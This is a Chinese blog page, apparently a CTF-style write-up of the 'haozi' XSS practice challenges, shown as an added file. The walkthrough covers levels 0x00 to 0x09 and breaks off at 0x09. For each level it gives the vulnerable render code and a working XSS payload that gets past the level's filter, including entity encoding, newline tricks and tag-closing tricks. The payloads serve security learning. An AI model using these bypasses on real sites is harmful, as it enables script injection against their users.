@@ -1,0 +1,1175 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/webicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="miloo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="源码、XSS……">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>耗子XSS - miloo&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"imiloo.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Miloo&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="耗子XSS"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-11 08:30" pubdate>
+          2022年8月11日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          88 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">耗子XSS</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2022年8月11日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <ul>
+<li><a href="#0x00">0x00</a></li>
+<li><a href="#0x01">0x01</a></li>
+<li><a href="#0x02">0x02</a></li>
+<li><a href="#0x03">0x03</a></li>
+<li><a href="#0x04">0x04</a></li>
+<li><a href="#0x05">0x05</a></li>
+<li><a href="#0x06">0x06</a></li>
+<li><a href="#0x07">0x07</a></li>
+<li><a href="#0x08">0x08</a></li>
+<li><a href="#0x09">0x09</a></li>
+<li><a href="#0x0a">0x0A</a></li>
+<li><a href="#0x0b">0x0B</a></li>
+<li><a href="#0x0c">0x0C</a></li>
+<li><a href="#0x0d">0x0D</a></li>
+<li><a href="#0x0e">0x0E</a></li>
+<li><a href="#0x0f">0x0F</a></li>
+<li><a href="#0x10">0x10</a></li>
+<li><a href="#0x11">0x11</a></li>
+<li><a href="#0x12">0x12</a></li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://xss.haozi.me/">耗子XSS</a></p>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><ul>
+<li>server 源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cscript%3Ealert(1)%3C%2Fscript%3E<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>输入参数被放在文本标签里，文本标签前后闭合即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/textarea&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%2Ftextarea%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Ctextarea%3E<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>参数作为 <code>&lt;input&gt;</code> 标签的 value 回显到前端，可以闭合 value 加上onclick事件，或者闭合 <code>&lt;input&gt;</code> 添加 alert</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>&quot; onclick=alert(1) &quot;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x27;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;&gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span> &quot;&quot;&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=&#x27;%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E<br><br>http://xss.test/?input=%22%20onclick%3Dalert(1)%20%22<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>过滤括号 <code>[()]</code>，可以使用反引号代替，html编码绕过，或者引用外部js文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripBracketsRe</span> = /[()]/g<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> input<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"># 反引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br><br># html编码绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"># 反引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br># html编码绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs url"># 反引号<br>http://xss.test/?input=%3Cscript%3Ealert%601%60%3C%2Fscript%3E%20<br><br># html编码绕过<br>http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>反引号也被过滤，html编码绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripBracketsRe</span> = /[()`]/g<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> input<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E%20<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>过滤 –&gt; 防止标签闭合，–!&gt; 同样可以闭合标签</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/--&gt;/g, <span class="hljs-string">&#x27;😂&#x27;</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;!-- &#x27;</span> + input + <span class="hljs-string">&#x27; --&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">--!&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- --!&gt;&lt;img src=# onerror=alert&amp;#x28;1&amp;#x29;&gt;  --&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=--!%3E%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E%20<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>过滤 auto|on.*&#x3D;|&gt; ，使用换行绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/auto|on.*=|&gt;/ig, <span class="hljs-string">&#x27;_&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `&lt;input value=<span class="hljs-number">1</span> $&#123;input&#125; type=<span class="hljs-string">&quot;text&quot;</span>&gt;`<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">type=&quot;image&quot; src=# onerror<br>=alert(1)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span></span><br><span class="hljs-tag">=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=type%3D%22image%22%20src%3D%23%20onerror%0A%3Dalert(1)<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>过滤 &lt;/?[^&gt;]+&gt; ，对&lt;&gt;括起来的内容进行过滤替换成空,但是由于HTML的容错性极高,所以,对于不闭合也能接受</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripTagsRe</span> = /&lt;\/?[^&gt;]+&gt;/gi<br><br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripTagsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span></span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span> &lt;/<span class="hljs-attr">article</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert(1)%20<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>过滤 </style> 标签，</style > 加空格即可绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">src</span>) </span>&#123;<br>  src = src.<span class="hljs-title function_ invoke__">replace</span>(/&lt;\/style&gt;/ig, <span class="hljs-string">&#x27;/* \u574F\u4EBA */&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `<br>    &lt;style&gt;<br>      $&#123;src&#125;<br>    &lt;/style&gt;<br>  `<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>插入代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;/style &gt; <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>网页代码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml"></span><br><span class="language-xml">      &lt;/style &gt; <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>URL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%2Fstyle%20%3E%20%3Cscript%3Ealert(1)%3C%2Fscript%3E<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><ul>
+<li>server 源码</li>
+</ul>
+<p>过滤了不是以<a target="_blank" rel="noopener" href="https://www.sogmentfault.com开头的字符串,以https//www.sogmentfault.com%E5%BC%80%E5%A4%B4%EF%BC%8C%E9%97%AD%E5%90%88%E6%A0%87%E7%AD%BE%E5%8D%B3%E5%8F%AF">https://www.sogmentfault.com开头的字符串，以https://www.sogmentfault.com开头，闭合标签即可</a></p>
